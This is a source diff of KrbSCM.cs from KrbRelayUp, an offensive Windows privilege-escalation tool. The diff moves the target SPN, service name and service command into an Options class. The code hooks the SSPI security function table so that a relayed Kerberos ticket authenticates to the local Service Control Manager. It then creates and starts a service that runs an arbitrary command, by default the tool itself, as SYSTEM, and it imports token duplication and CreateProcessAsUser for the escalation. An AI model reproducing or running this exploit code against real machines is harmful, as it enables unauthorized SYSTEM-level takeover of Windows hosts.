@@ -1,7 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -10,7 +7,6 @@ namespace KrbRelayUp
 
     class KrbSCM
     {
-        public static string targetSPN = null;
 
         [STAThread]
         public static int AcquireCredentialsHandleHook(string pszPrincipal, StringBuilder pszPackage, int fCredentialUse, IntPtr PAuthenticationID, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential, IntPtr ptsExpiry)
@@ -24,14 +20,13 @@ namespace KrbRelayUp
         public static int InitializeSecurityContextHook(ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext, string pszTargetName, int fContextReq, int Reserved1, int TargetDataRep, ref SecBufferDesc pInput, int Reserved2, out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput, out int pfContextAttr, out SECURITY_HANDLE ptsExpiry)
         {
             Console.WriteLine($"[+] InitializeSecurityContextHook called for target {pszTargetName}");
-            int status = InitializeSecurityContext(ref phCredential, ref phContext, targetSPN, fContextReq, Reserved1, TargetDataRep, ref pInput, Reserved2, out phNewContext, out pOutput, out pfContextAttr, out ptsExpiry);
+            int status = InitializeSecurityContext(ref phCredential, ref phContext, Options.targetSPN, fContextReq, Reserved1, TargetDataRep, ref pInput, Reserved2, out phNewContext, out pOutput, out pfContextAttr, out ptsExpiry);
             Console.WriteLine($"[+] InitializeSecurityContext status = 0x{status:X8}");
             return status;
         }
 
-        public static void Run(string spn, string serviceName, string serviceCommand)
+        public static void Run()
         {
-            targetSPN = spn;
             // Initialize SecurityInterface
             Console.WriteLine("[+] Using ticket to connect to Service Manger");
             IntPtr functionTable = InitSecurityInterface();
@@ -41,19 +36,19 @@ namespace KrbRelayUp
             FuncAcquireCredentialsHandle DelegAcquireCredentialsHandle = new FuncAcquireCredentialsHandle(AcquireCredentialsHandleHook);
             byte[] bAcquireCredentialsHandle = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(DelegAcquireCredentialsHandle).ToInt64());
             int oAcquireCredentialsHandle = Marshal.OffsetOf(typeof(SecurityFunctionTable), "AcquireCredentialsHandle").ToInt32();
-            Marshal.Copy(bAcquireCredentialsHandle, 0, (IntPtr)functionTable + oAcquireCredentialsHandle, bAcquireCredentialsHandle.Length);
+            Marshal.Copy(bAcquireCredentialsHandle, 0, functionTable + oAcquireCredentialsHandle, bAcquireCredentialsHandle.Length);
 
             // Hook InitializeSecurityContext function
             FuncInitializeSecurityContext DelegInitializeSecurityContext = new FuncInitializeSecurityContext(InitializeSecurityContextHook);
             byte[] bInitializeSecurityContext = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(DelegInitializeSecurityContext).ToInt64());
             int oInitializeSecurityContext = Marshal.OffsetOf(typeof(SecurityFunctionTable), "InitializeSecurityContext").ToInt32();
-            Marshal.Copy(bInitializeSecurityContext, 0, (IntPtr)functionTable + oInitializeSecurityContext, bInitializeSecurityContext.Length);
+            Marshal.Copy(bInitializeSecurityContext, 0, functionTable + oInitializeSecurityContext, bInitializeSecurityContext.Length);
 
-            if (String.IsNullOrEmpty(serviceCommand))
+            if (String.IsNullOrEmpty(Options.serviceCommand))
             {
                 string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
                 int session_id = System.Diagnostics.Process.GetCurrentProcess().SessionId;
-                serviceCommand = $"\"{exe}\" system {session_id}\n";
+                Options.serviceCommand = $"\"{exe}\" system {session_id}\n";
             }
 
             IntPtr hScm = OpenSCManager("127.0.0.1", null, ScmAccessRights.Connect | ScmAccessRights.CreateService);
@@ -64,7 +59,7 @@ namespace KrbRelayUp
                 return;
             }
 
-            IntPtr hService = CreateService(hScm, serviceName, null, ServiceAccessRights.AllAccess, 0x10, ServiceBootFlag.DemandStart, ServiceError.Ignore, serviceCommand, null, IntPtr.Zero, null, null, null);
+            IntPtr hService = CreateService(hScm, Options.serviceName, null, ServiceAccessRights.AllAccess, 0x10, ServiceBootFlag.DemandStart, ServiceError.Ignore, Options.serviceCommand, null, IntPtr.Zero, null, null, null);
 
             if (hService == IntPtr.Zero)
             {
@@ -76,19 +71,19 @@ namespace KrbRelayUp
                 }
                 else
                 {
-                    hService = OpenService(hScm, serviceName, ServiceAccessRights.AllAccess);
+                    hService = OpenService(hScm, Options.serviceName, ServiceAccessRights.AllAccess);
                     if (hService == IntPtr.Zero)
                     {
-                        Console.WriteLine($"[-] Error opening {serviceName} Service: {Marshal.GetLastWin32Error()}");
+                        Console.WriteLine($"[-] Error opening {Options.serviceName} Service: {Marshal.GetLastWin32Error()}");
                         return;
                     }
                 }
             }
-            Console.WriteLine($"[+] {serviceName} Service created");
+            Console.WriteLine($"[+] {Options.serviceName} Service created");
 
             StartService(hService, 0, null);
 
-            Console.WriteLine($"[+] {serviceName} Service started");
+            Console.WriteLine($"[+] {Options.serviceName} Service started");
 
             System.Threading.Thread.Sleep(1000);
 
@@ -382,13 +377,13 @@ namespace KrbRelayUp
         internal static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
 
         [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
-        private extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        private static extern bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
         [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
-        private extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);
+        private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);
 
         [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        private extern static bool CloseHandle(IntPtr handle);
+        private static extern bool CloseHandle(IntPtr handle);
 
         [DllImport("advapi32")] public static extern bool SetTokenInformation(IntPtr TokenHandle, short TokenInformationClass, ref int TokenInformation, int TokenInformationLength);
 
